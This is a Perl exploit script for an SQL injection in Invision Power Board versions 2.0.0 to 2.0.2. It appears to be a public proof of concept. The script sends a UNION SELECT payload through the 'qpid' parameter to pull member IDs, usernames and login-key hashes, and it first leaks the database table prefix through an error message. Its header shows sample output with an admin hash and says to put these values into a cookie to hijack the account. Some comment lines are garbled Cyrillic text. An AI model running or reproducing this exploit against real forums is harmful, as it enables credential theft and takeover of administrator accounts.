#!/usr/bin/perl
use IO::Socket;

 			     ##                 ##           

## Invision Power Board v2.0.0 - 2.0.2 sql injection exploit
## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## example:
##
## ipb.pl 127.0.0.1 /IPB202/ 2 1 3edb1eaeea640d297ee3b1f78b5679b3
## ------------------------------------------------------------------------------------------------
## [>] SERVER: 127.0.0.1
## [>]    DIR: /IPB202/
## [>]  FORUM: 2
## [>]  TOPIC: 1
## [>]    SID: 3edb1eaeea640d297ee3b1f78b5679b3
## [>] PREFIX:
## [>]     ID:
## ------------------------------------------------------------------------------------------------
## 
## [~] PREPARE TO CONNECT...
## [+] CONNECTED
## [~] SENDING QUERY...
## [+] DONE!
## 
## PREFIX: ibf_
##
## ipb.pl 127.0.0.1 /IPB202/ 2 1 3edb1eaeea640d297ee3b1f78b5679b3 ibf_
## ------------------------------------------------------------------------------------------------
## [>] SERVER: 127.0.0.1
## [>]    DIR: /IPB202/
## [>]  FORUM: 2
## [>]  TOPIC: 1
## [>]    SID: 3edb1eaeea640d297ee3b1f78b5679b3
## [>] PREFIX: ibf_
## [>]     ID:
## ------------------------------------------------------------------------------------------------
## 
## [~] PREPARE TO CONNECT...
## [+] CONNECTED
## [~] SENDING QUERY...
## [+] DONE!
## 
## --[ REPORT ]------------------------------------------------------------------------------------
## MEMBER_ID: [1] NAME: [admin] PASS_HASH: [73dea61281aa9b08ed31b4ae2bb9954e]
## ------------------------------------------------------------------------------------------------
## Now you need edit cookie and insert new pass_hash and member_id values.
## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## §±§Ñ§â§å §ã§Ý§à§Ó §à §Ó§à§Ù§Ó§â§Ñ§ë§Ñ§Ö§Þ§à§Þ §ï§Ü§ã§á§Ý§à§Ú§ä§à§Þ §â§Ö§Ù§å§Ý§î§ä§Ñ§ä§Ö:
## §©§ß§Ñ§é§Ö§ß§Ú§Ö pass_hash §ï§ä§à §ß§Ö §Ù§Ñ§ê§Ú§æ§â§à§Ó§Ñ§ß§ß§í§Û §á§Ñ§â§à§Ý§î §ð§Ù§Ö§â§Ñ!!! §Ñ §à§Õ§ß§à§Ú§Þ§Ö§ß§ß§à§Ö §Ù§ß§Ñ§é§Ö§ß§Ú§Ö §Ú§Ù §Ü§å§Ü§Ú§ã§Ñ §ã
## §á§à§Þ§à§ë§î§ð §Ü§à§ä§à§â§à§Ô§à §Þ§à§Ø§ß§à §Ó§à§Û§ä§Ú §ß§Ñ §æ§à§â§å§Þ §á§à§Õ §Ý§ð§Ò§í§Þ §ð§Ù§Ö§â§à§Þ §Ò§Ö§Ù §Ó§Ó§à§Õ§Ñ §á§Ñ§â§à§Ý§ñ. 
## member_id §ï§ä§à §ä§Ñ§Ü§Ø§Ö §à§Õ§ß§à§Ú§Þ§Ö§ß§ß§à§Ö §Ù§ß§Ñ§é§Ö§ß§Ú§Ö §Ú§Ù §Ü§å§Ü§Ú§ã§Ñ.
## §±§à§ï§ä§à§Þ§å §ß§Ö §ã§ä§à§Ú§ä §á§í§ä§Ñ§ä§î§ã§ñ §â§Ñ§ã§ê§Ú§æ§â§à§Ó§Ñ§ä§î pass_hash =) §±§â§à§ã§ä§à §Ù§Ñ§â§Ö§Ô§Ú§ã§ä§â§Ú§â§å§Û§ä§Ö§ã§î §ß§Ñ §æ§à§â§å§Þ§Ö §Ú §Ú§Ù§Þ§Ö§ß§Ú§ä§Ö
## pass_hash §Ú member_id §Ó §Ó§Ñ§ê§Ö§Þ cookie §ß§Ñ §à§Õ§ß§à §Ú§Ù §Ù§ß§Ñ§é§Ö§ß§Ú§Û §Ü§à§ä§à§â§í§Ö §Ó§í§Õ§Ñ§ã§ä §ã§á§Ý§à§Ú§ä.
## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


if (@ARGV < 5)
{
print "-------------------------------------------------------------------------\r\n";
print "       Invision Power Board v2.0.0 - 2.0.2 sql injection exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "usage:\r\n";
print "ipb.pl SERVER /DIR/ FORUM_NUM TOPIC_NUM SID [TABLE_PREFIX] [USER_ID]\r\n\r\n";
print "SERVER         - server where IPB installed\r\n";
print "/DIR/          - IPB directory or / for no directory\r\n";
print "FORUM_NUM      - number of existing forum\r\n";
print "TOPIC_NUM      - number of existing topic\r\n";
print "SID            - your session id\r\n";
print "[TABLE_PREFIX] - table prefix in database\r\n";
print "[USER_ID]      - user id for exploiting\r\n\r\n"; 
print "e.g. ipb.pl 127.0.0.1 /IPB/ 2 1 4496b6d35c1bc0662d721c207f81784e ibf_\r\n";
print "-------------------------------------------------------------------------\r\n";
exit();
}

if (@ARGV < 6) { $get_table = 1; }

$server = $ARGV[0];
$dir    = $ARGV[1];
$fnum   = $ARGV[2];
$tnum   = $ARGV[3];
$sid    = $ARGV[4];
$prefix = $ARGV[5];
$id     = $ARGV[6];

print "------------------------------------------------------------------------------------------------\r\n";
print "[>] SERVER: $server\r\n";
print "[>]    DIR: $dir\r\n";
print "[>]  FORUM: $fnum\r\n";
print "[>]  TOPIC: $tnum\r\n";
print "[>]    SID: $sid\r\n";
print "[>] PREFIX: $prefix\r\n";
print "[>]     ID: $id\r\n";
print "------------------------------------------------------------------------------------------------\r\n\r\n";

$server =~ s/(http:\/\/)//eg;

$path  = $dir;
$path .= "index.php?s=";
$path .= $sid;
$path .= "&act=Post&CODE=02&f=";
$path .= $fnum;
$path .= "&t=";
$path .= $tnum;
if ($get_table == 1) 
 {
 $path .= "&qpid=r57"
 }
else
 {
$path .= "&qpid=666666666)%20union%20select%201,1,1,1,1,1,1,1,1,1,CONCAT(id,char(58),name,char(58),member_login_key),1,1,1,1,1,1,1,1,1%20from%20";
$path .= $prefix;
$path .= "members";
$path .= ($id)?("%20WHERE%20id=$id%20"):("%20");
$path .= "/*";
 }
print "[~] PREPARE TO CONNECT...\r\n";

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort => "80") || die "[-] CONNECTION FAILED";

print "[+] CONNECTED\r\n";
print "[~] SENDING QUERY...\r\n";
print $socket "GET $path HTTP/1.1\r\n";
print $socket "Host: $server\r\n";                                                                                                                                                          
print $socket "Accept: */*\r\n";
print $socket "Connection: close\r\n\r\n";
print "[+] DONE!\r\n\r\n";

$suc =0;

if ($get_table == 1)
 {
 while ($answer = <$socket>)
  {
  if ($answer =~ /(mySQL query error: )(.*)( FROM )(.*)(posts)/){ print "PREFIX: $4\r\n"; $suc = 1; }
  }
 if (!$suc) { print "Exploit failed\r\n"; }
 exit();
 }

print "--[ REPORT ]------------------------------------------------------------------------------------\r\n";
while ($answer = <$socket>)
{
 if ($answer =~ /^([^:]*):([^:]*):([a-z,0-9]{32})$/) { print "MEMBER_ID: [$1] NAME: [$2] PASS_HASH: [$3]\r\n"; $suc = 1; }
}
print "------------------------------------------------------------------------------------------------\r\n";
if ($suc == 1) { print "Now you need edit cookie and insert new pass_hash and member_id values.\r\n"; exit(); }
else { print "Exploit failed\r\n"; }